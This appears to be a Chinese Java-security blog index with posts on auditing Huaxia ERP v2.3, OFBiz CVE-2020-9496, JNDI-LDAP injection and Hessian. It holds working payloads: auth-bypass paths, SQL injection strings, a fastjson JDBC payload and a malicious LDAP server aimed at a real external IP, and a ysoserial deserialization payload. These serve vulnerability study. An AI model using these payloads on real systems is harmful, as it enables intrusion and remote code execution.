[{"categories":["javasec"],"content":"华夏 ERP CMS v2.3代码审计 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:0:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"环境搭建 下载地址：https://github.com/jishenghua/jshERP/releases/tag/2.3 是个 spring boot 框架，根据配置文件 application.properties 创建数据库，然后导入 sql 文件，最后修改个不冲突的端口。 利用 navicat 创建数据库并导入 sql 文件 启动后长这样 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:1:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"审计流程 在正式进行代码审计前先走一遍代码审计的流程，看 pom.xml 文件，毫无疑问 spring boot 框架 数据库操作类用的是 mybatis 数据库是 mysql，这我们也是知道的， 还有就是用来 fastjson 和 swagger2 然后再看看路由机制，因为是 spring 框架嘛直接看 controller 文件下，路由机制比较简单，都是放在这个目录下的。 看路由机制主要是为了待会方便验证漏洞。 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:2:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"未授权访问 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:3:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"filter 审计 这个 cms 是使用的 filter 进行鉴权，来到 filter 模块，通过 init 使得allowUrls 为 /user/login#/user/registerUser#/v2/api-docs 这些路径，然后ignoredUrls 为这些 .css#.js#.jpg#.png#.gif#.ico 后缀的路由 猜测这两个变量中的路由应该是不用鉴权，然后继续看 dofilter 方法 第一个是如果获得的 session 中 user 值不为 null 通过验证，然后就是如果请求的是 register.html，login.html，以及 doc.html 也不会进行拦截，还有就是对于 ignoredList 和 allowUrls 变量中的请求路径是不会拦截的。 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:3:1","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"未授权分析 看来上面分析第一中包含.css 就行了，尝试看能不能通过这种形式进行绕过 .css/../account/getAccount，看到成功再未登录情况下获得了后台数据 还可以用第二种情况，通过白名单路径进行路径穿越，同样成功访问了后台信息 更多利用形式 /login.html/../account/getAccount /register.html/../account/getAccount /ch4ser.css/../account/getAccount /ch4ser.jpg/../account/getAccount /user/login/../../account/getAccount /user/registerUser/../../account/getAccount ........","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:3:2","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"XSS 代码审计 xss 漏洞说实话没有太好的审计方法，一般是直接在输入框尝试看看，因为上面看到没有 filter 进行过滤，看到基本上随便一个输入框都会弹。 类似的 xss 还有很多，添加商品处直接储存型 xss。 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:4:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"SQL 注入 刚刚看依赖是使用 mybaits 数据库操作类，搜索关键词 %${ //因为模糊查询不能直接使用%#{}%，所以不会的开发可能会使用%${}%形式，这种就存在sql注入 in (${ //使用in (#{}这种形式会报错 order by ${ //order by也不能使用预编译直接搜索 %${，搜出来一大堆， 比如这里进入 AccountMapperEx.xml 文件中，看一下 xml 文件中的信息，第一个红框是命名空间，其实就是绑定的接口，然后第二个红框是方法名称， 实际开发当中，对应 AccountMapperEx.xml 的一般都是定义在 AccountMapperEx 接口中（如果封装的好的话)，看到这里这个接口内的这些方法都可以造成 sql 注入，因为都用的${}形式 MyBatis 的处理流程一般为 controller–\u003eservice–\u003eMapper–\u003exml文件映射–\u003e执行数据库操作。所以逆推，接下来就是找 AccountService，看到在其 select 方法中调用了 selectByConditionAccount 方法 查询调用方法只有一个结果，看到参数 name 是通过 map 参数里面拿出来的， 在该类的 select 进行了调用， 然后继续逆推，看到貌似是根据 container.getCommonQuery(apiName) 来选择调用哪个类的 select 方法， 最后来到了 controller，在这里可以进行输入测试，这个 parameterMap 我们完全是可控的，通过 search 参数传入，然后 put 进 map 中，最后 sink 点的 name 等参数就是从 map 中拿出来的。 传入下面 payload，但是发现并没有成功延时 /account/list?search=%7b%22%6e%61%6d%65%22%3a%22%22%2c%22%73%65%72%69%61%6c%4e%6f%22%3a%22%22%2c%22%72%65%6d%61%72%6b%22%3a%22%31%27%4f%52%20%73%6c%65%65%70%28%34%29%2d%2d%20%22%7d\u0026pageSize=1\u0026currentPage=1看日志内容，发现是执行了 sql 语句的， 但是因为括号的原因导致我们的 sleep 命令没有成功，然后尝试进行闭合括号，但是又会报错，因为其实在执行这个 sql 语句前面还有 sql 语句的构造，会根据 xml 文件进行构造，前面因为括号没有闭合报错导致不能到这步，尝试绕过了半天没有绕过。 没办法，只有换其他点继续审计了，在 UserMapperEx.xml 文件中，同样因为模糊查询使用了 ${} 形式没有进行预编译， 还是从 Userservice 一直逆，同样来到这里 最后还是在 ResourceController 中进行了调用， 还是构造如下 payload /user/list?search={\"userName\":\"\",\"loginName\":\"' AND SLEEP(5)--\"}\u0026pageSize=1\u0026currentPage=12看到成功延时 看看其 sql 语句，因为没有括号的限制导致直接就能执行 sleep。 SELECT count(user.id) FROM jsh_user user LEFT JOIN jsh_user_business ub ON user.id = ub.key_id LEFT JOIN jsh_orga_user_rel rel ON rel.tenant_id = 132 AND user.id = rel.user_id AND ifnull(rel.delete_flag, '0') != '1' LEFT JOIN jsh_organization org ON org.tenant_id = 132 AND rel.orga_id = org.id AND ifnull(org.org_stcd, '0') != '5' WHERE user.tenant_id = 132 AND 1 = 1 AND ifnull(user.status, '0') NOT IN ('1', '2') AND user.login_name LIKE '%' AND SLEEP(5)其他的功能点其实也是差不多的，需要多试试。 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:5:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"fastjosn 反序列化 因为用了 fastjson 的依赖，版本为 1.2.55，可以利用 1.2.68 的 payload 进行一个通杀。 全局搜索下面关键词 parseObject( JSONObject.parse( JSONObject.parseObject(结果有点多，还是一个一个排查，找参数可控的 其中在 getInfo 中有进行反序列化方法的调用， 调用这个方法的地方很多，比如在上面的 getUserList 方法， 明显 search 可控，构造一个 urldns 的请求，payload 如下 {\"@type\":\"java.net.Inet4Address\",\"val\":\"d84dfa38.log.dnslog.myfw.us.\"}成功收到 dns 解析， 但是版本是 1.2.55，无法利用 1.2.47 得进行通杀，可以利用 1.2.68 得 payload 进行通杀，因为还有 mysql 的依赖，可以打 jdbc，但是打 jdbc 需要反序列化链（或者读文件），感觉的化应该用 spring aop 链可以打，但是懒得弄了，直接添加个 cc 依赖尝试。 \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e然后 vps 上启个恶意的 mysqlserver fastjson1.2.68 的 jdbc payload（需要根据 mysql 的版本选择） { \"a\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"47.109.156.81\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"cc6\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } }最后成功弹出计算机， 只不过这里的 cc 依赖是自己添加的，只是为了证明可以打，实际可以打 spring aop 链。 后面看到好像还有 Hikari 库，可以直接打 jndi（不过需要 atuotype 为 true 才行）。 ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:6:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"总结 参考：https://drun1baby.top/2022/09/30/Java-代码审计之华夏-ERP-CMS-V2.3/#5-Fastjson-反序列化-RCE 参考：https://xilitter.github.io/2024/04/30/java代码审计-华夏ERP-v2-3/index.html ","date":"2025-04-26","objectID":"/posts/%E5%8D%8E%E5%A4%8Fcms/:7:0","tags":["java"],"title":"华夏 ERP CMS v2.3代码审计","uri":"/posts/%E5%8D%8E%E5%A4%8Fcms/"},{"categories":["javasec"],"content":"Apache OfBiz 反序列化命令（CVE-2020-9496） ","date":"2025-04-06","objectID":"/posts/apacheofbiz/:0:0","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"漏洞描述 Apache OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。 OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。 其17.12.04版本之前的XMLRPC接口存在一处反序列化漏洞，攻击者利用这个漏洞可以在目标服务器上执行任意命令。 ","date":"2025-04-06","objectID":"/posts/apacheofbiz/:1:0","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"环境搭建 cd vulhub-master/ofbiz/ofbiz/CVE-2020-9496 docker-compose up -d然后访问 https://localhost:8443/accounting/control/main，注意需要用 https 协议 源码下载地址：https://archive.apache.org/dist/ofbiz/，下载 ofbiz17.12.1 版本，用 idea 打开看到 gradle 构建全是报错， vulhub 开启了调试端口，直接配置远程调试好了 ","date":"2025-04-06","objectID":"/posts/apacheofbiz/:2:0","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"漏洞复现 利用 ysoseral 生成反序列化 payload， java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \"touch /tmp/success\"|base64 -w 0得到poc \u003c?xml version=\"1.0\"?\u003e \u003cmethodCall\u003e \u003cmethodName\u003eProjectDiscovery\u003c/methodName\u003e \u003cparams\u003e \u003cparam\u003e \u003cvalue\u003e \u003cstruct\u003e \u003cmember\u003e \u003cname\u003etest\u003c/name\u003e \u003cvalue\u003e \u003cserializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\"\u003erO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqTK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASdG91Y2ggL3RtcC9zdWNjZXNzCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAceXNvc2VyaWFsL1B3bmVyMTg4NDg3MTkxMzczOQEAHkx5c29zZXJpYWwvUHduZXIxODg0ODcxOTEzNzM5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AEAAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAA","date":"2025-04-06","objectID":"/posts/apacheofbiz/:3:0","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"漏洞分析 ","date":"2025-04-06","objectID":"/posts/apacheofbiz/:4:0","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"XML-RPC消息 在漏洞分析前先简单了解一下 XML-RPC 消息。 一、XML-RPC数据类型 xmlrpc支持多种数据类型，对应的xml标签包括 base64、struct、array 等，下面是几种常见的数据类型 \u003c!-- array --\u003e \u003cvalue\u003e \u003carray\u003e \u003cdata\u003e \u003cvalue\u003e\u003cint\u003e7\u003c/int\u003e\u003c/value\u003e \u003c/data\u003e \u003c/array\u003e \u003c/value\u003e \u003c!-- struct --\u003e \u003cstruct\u003e \u003cmember\u003e \u003cname\u003efoo\u003c/name\u003e \u003cvalue\u003ebar\u003c/value\u003e \u003c/member\u003e \u003c/struct\u003e二、XML-RPC消息格式 每个XML-RPC请求都以\u003cmethodCall\u003e\u003c/methodCall\u003e开头，该元素包含单个子元素\u003cmethodName\u003emethod\u003c/methodName\u003e，元素\u003cmethodName\u003e包含子元素\u003cparams\u003e，\u003cparams\u003e可以包含一个或多个\u003cparam\u003e元素。如： POST /RPC2 HTTP/1.0 User-Agent: Frontier/5.1.2 (WinNT) Host: betty.userland.com Content-Type: text/xml Content-length: 181 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cmethodCall\u003e \u003cmethodName\u003eexamples.getStateName\u003c/methodName\u003e \u003cparams\u003e \u003cparam\u003e \u003cvalue\u003e \u003ci4\u003e41\u003c/i4\u003e \u003c/value\u003e \u003c/param\u003e \u003c/params\u003e \u003c/methodCall\u003e","date":"2025-04-06","objectID":"/posts/apacheofbiz/:4:1","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"调试分析 根据路由 /webtools/control/xmlrpc 定位到 framework/webtools/webapp/webtools/WEB-INF/web.xml 文件，看具体处理的类是哪个 看到处理类是 org.apache.ofbiz.webapp.control.ControlServlet，那么跟进这个类，在其 dopost 方法上下上断点， 然后跟进这个 doget 方法，在这里 requestHandler.doRequest 继续跟进， controllerConfig 根据 controller.xml 配置文件来获取 url 信息， 默认有 216 个，不同路由对应不同的类。 然后接着会从 requestMapMap 中获得我们请求路由 xmlrpc 对应的处理类， 然后来到这里， 跟进这个 runEvent 方法，就是根据 requestMap.event 信息去查找负责处理event的handler，然后通过 invoke 进行具体调用，连续循环几次就会到我们的 xmlrpc， 跟进 invoke 方法，没有传入 echo 参数，进入 else 条件， 然后继续跟进下下面这个 execute 方法， 调用 getRequest 对请求内容进行处理， 跟进该方法，直接调用了 SAXParsers.newXMLReader.parse 解析我们的输入流， 需要添加xmlrpc-common-3.1.3.jar 依赖包，经过一系列重载的 parse 方法调用，最后来到 startElement 方法 会调用其父类的 startElement 方法， 对pURI进行了判断，这也是为什么我们的payload要设置xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\" 接着会调用ByteArrayParser的startElement进行一个base64解码 最后又是一通调用，最后来到 SerializableParser#getResult 方法进行反序列化， ","date":"2025-04-06","objectID":"/posts/apacheofbiz/:4:2","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"漏洞修复 增加了鉴权，让这个功能点不能未授权访问。 参考：https://ilikeoyt.github.io/2024/09/10/Apache-OfBiz-反序列化命令执行漏洞-分析（CVE-2020-9496）/#more 参考：https://xz.aliyun.com/news/7919，这篇文章分析得非常全面。 ","date":"2025-04-06","objectID":"/posts/apacheofbiz/:5:0","tags":["java"],"title":"Apache OfBiz 反序列化命令（CVE-2020-9496）","uri":"/posts/apacheofbiz/"},{"categories":["javasec"],"content":"JNDI 之 LDAP 过程原理 前言：在 Java JNDI 注入中只分析了 RMI 协议的 jndi 注入，下面简单分析以下 ldap 协议的过程。 poc package org.example; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LDAP_Server { private static final String LDAP_BASE = \"dc=gaoren,dc=com\"; public static void main ( String[] tmp_args ) { String[] args=new String[]{\"http://47.109.156.81:6666/#LDAP_POC\"}; int port = 9999; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", //$NON-NLS-1$ InetAddress.getByName(\"0.0.0.0\"), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); //$NON-NLS-1$ ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { e.addAttribute(\"javaClassName\", \"foo\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos \u003e 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$ e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } }客户端 import javax.naming.InitialContext; public class testjndi { public static void main(String[]args) throws Exception{ String string = \"ldap://localhost:9999/LDAP_POC\"; InitialContext initialContext = new InitialContext(); initialContext.lookup(string); } } ","date":"2025-04-01","objectID":"/posts/jndi-ldap/:0:0","tags":["java","反序列化"],"title":"JNDI 之 LDAP 过程原理","uri":"/posts/jndi-ldap/"},{"categories":["javasec"],"content":"过程分析 ","date":"2025-04-01","objectID":"/posts/jndi-ldap/:1:0","tags":["java","反序列化"],"title":"JNDI 之 LDAP 过程原理","uri":"/posts/jndi-ldap/"},{"categories":["javasec"],"content":"反序列化 经过简单的调用同样直接来到 getURLObject 方法寻找协议对应工厂， 然后来到 ldapURLContextFactory.getObjectInstance 方法， 就是实列化一个 ldapURLContext 对象，一直返回，看到会调用到 ldapURLContext.lookup 方法 继续调用其父类的 lookup 方法，同样是 GenericURLContext.lookup 方法 然后这里是调用 LdapCtx.lookup 方法 继续调用其 p_lookup 方法， 接着又是 c_lookup 方法 同样调用了 decodeObject 方法，只 rmi 中是调用到了 RegistryContext.decodeObject，这里是 Obj.decodeObject 有deserializeObject 函数，在调用前有个 if (!VersionHelper.isSerialDataAllowed()) 条件，不过这里是满足的，继续跟进 最后进行了反序列化， ","date":"2025-04-01","objectID":"/posts/jndi-ldap/:1:1","tags":["java","反序列化"],"title":"JNDI 之 LDAP 过程原理","uri":"/posts/jndi-ldap/"},{"categories":["javasec"],"content":"加载远程类 接着 c_lookup 方法看，除了调用 decodeObject，在下面还调用了 DirectoryManager.getObjectInstance() 方法 跟进 getObjectFactoryFromReference 方法 看到同样进行了远程类加载，然后实列化， 不过由于我这里是 jdk17 版本，trustURLClassbase 为 false，所以没有成功加载 低版本最后就就能进行远程加载。 ","date":"2025-04-01","objectID":"/posts/jndi-ldap/:1:2","tags":["java","反序列化"],"title":"JNDI 之 LDAP 过程原理","uri":"/posts/jndi-ldap/"},{"categories":["javasec"],"content":"Hessian 反序列化 ","date":"2025-03-06","objectID":"/posts/hessian/:0:0","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"Hessian 概述 hessian 是个轻量级的远程 http 工具，采用 binaray Rpc 协议，适合发送二进制数据，同时具有防火墙穿透功能，hessian 一般通过 web 应用来提供服务。一句话说就是 Hessian 是一个基于 http 的二进制 rpc 轻量级工具。 什么是 RPC 呢？Remote Procedure Call Protocol，远程过程调用，RPC 它以标准的二进制格式来定义请求的信息（请求对象、方法、参数等），这种方法传输信息的优点之一就是跨语言及操作系统。 在面向对象编程范式下，RMI 其实就是 RPC 的一种具体实现，PRC 协议的一次远程通信过程： 客户端发起请求，并且按照 RPC 协议格式填充信息 填充完毕后将二进制格式文件转化为流，通过传输协议进行传输 服务端接收到流后，将其转换为二进制格式文件，并且按照 RPC 协议格式获取请求的信息并进行处理 处理完毕后将结果按照 RPC 协议格式写入二进制格式文件中并返回 ","date":"2025-03-06","objectID":"/posts/hessian/:1:0","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"远程调用示例 基于 Servlet 项目 先创建个一个提供服务的 api 接口，也就是接口类 package org.example; public interface Greeting { String sayHello(); }然后需要创建服务端，这里通过继承 com.caucho.hessian.server.HessianServlet 类来把服务端注册为 servlet 进行服务交互。需要在 WEB-INF 中创建 lib 目录，然后在 lib 中引入依赖。 import com.caucho.hessian.server.HessianServlet; public class Server extends HessianServlet implements Greeting{ @Override public String sayHello() { return \"gaorenyusi\"; } }然后配置 web.xml ，为服务端设置映射，映射后访问路径 /gaoren 就会触发 servlet 服务 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"\u003e \u003cservlet\u003e \u003cservlet-name\u003ehesian\u003c/servlet-name\u003e \u003cservlet-class\u003eServer\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003ehesian\u003c/servlet-name\u003e \u003curl-pattern\u003e/gaoren\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003c/web-app\u003e启动一下，访问： 然后写个客户端进行调用， package org.example; import com.caucho.hessian.client.HessianProxyFactory; public class Main { public static void main(String[] args) throws Exception { String url = \"http://localhost:8088/test/gaoren\"; HessianProxyFactory hessianProxyFactory = new HessianProxyFactory(); Greeting hello = (Greeting) hessianProxyFactory.create(Greeting.class, url); System.out.println(hello.sayHello()); } }通过 com.caucho.hessian.client.HessianProxyFactory 工厂类创建对接口的代理对象来进行调用， ","date":"2025-03-06","objectID":"/posts/hessian/:2:0","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"远程调用源码分析 ","date":"2025-03-06","objectID":"/posts/hessian/:3:0","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"客户端处理 HessianProxyFactory hessianProxyFactory = new HessianProxyFactory(); 工厂类的实例化，主要是初始化类加载器已经相应的 resovler 